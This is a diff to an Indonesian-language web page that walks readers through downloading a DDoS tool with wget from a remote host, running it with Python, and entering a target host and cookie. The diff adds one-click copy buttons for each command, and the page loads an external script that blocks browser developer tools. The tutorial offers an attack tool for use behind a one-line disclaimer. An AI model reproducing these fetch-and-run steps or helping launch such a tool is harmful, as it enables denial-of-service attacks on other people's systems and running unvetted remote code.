@@ -40,6 +40,18 @@
             border-radius: 5px;
             overflow-x: auto;
             color: #fff;
+            position: relative;
+        }
+        pre button {
+            position: absolute;
+            right: 10px;
+            top: 10px;
+            background-color: #444;
+            color: #fff;
+            border: none;
+            padding: 5px 10px;
+            cursor: pointer;
+            border-radius: 3px;
         }
         h1, h2 {
             color: #fff;
@@ -60,30 +72,39 @@
     </div>
     <h2>Persiapan</h2>
     <p>Pastikan Python sudah terinstal di sistem Anda. Anda dapat memeriksanya dengan menjalankan perintah berikut di terminal atau command prompt:</p>
-    <pre><code>python3 --version</code></pre>
+    <pre><code>python3 --version</code><button onclick="copyToClipboard('python3 --version')">Copy</button></pre>
 
     <h2>Langkah-langkah Instalasi dan Eksekusi</h2>
     <ol>
         <li>
             <h3>Download File</h3>
             <p>Gunakan perintah <code>wget</code> untuk mengunduh file dari tautan berikut:</p>
-            <pre><code>wget https://ddos.mnytc.com/main.py</code></pre>
+            <pre><code>wget https://ddos.mnytc.com/main.py</code><button onclick="copyToClipboard('wget https://ddos.mnytc.com/main.py')">Copy</button></pre>
         </li>
         <li>
             <h3>Jalankan Tools</h3>
             <p>Jalankan file yang telah diunduh menggunakan Python 3:</p>
-            <pre><code>python3 main.py</code></pre>
+            <pre><code>python3 main.py</code><button onclick="copyToClipboard('python3 main.py')">Copy</button></pre>
         </li>
         <li>
             <h3>Masukkan Host dan Cookie</h3>
             <p>Anda akan diminta untuk memasukkan host dan cookie. Masukkan informasi yang diperlukan sesuai dengan instruksi yang diberikan oleh tools:</p>
-            <pre><code>Masukkan host: [host target]
-Masukkan cookie: [cookie yang sesuai]</code></pre>
+            <pre><code>Masukkan host: [host target]\nMasukkan cookie: [cookie yang sesuai]</code><button onclick="copyToClipboard('Masukkan host: [host target]\nMasukkan cookie: [cookie yang sesuai]')">Copy</button></pre>
         </li>
     </ol>
 
     <h2>Kesimpulan</h2>
     <p>Anda telah berhasil mengunduh dan menjalankan tools DDoS. Ingatlah untuk selalu menggunakan tools ini dengan tanggung jawab dan hanya untuk tujuan yang sah.</p>
+
+    <script>
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(function() {
+                alert('Text copied to clipboard');
+            }, function(err) {
+                alert('Failed to copy text: ', err);
+            });
+        }
+    </script>
     <script disable-devtool-auto src='https://files.mnytc.com/inspect-block.txt'></script>
 </body>
 </html>
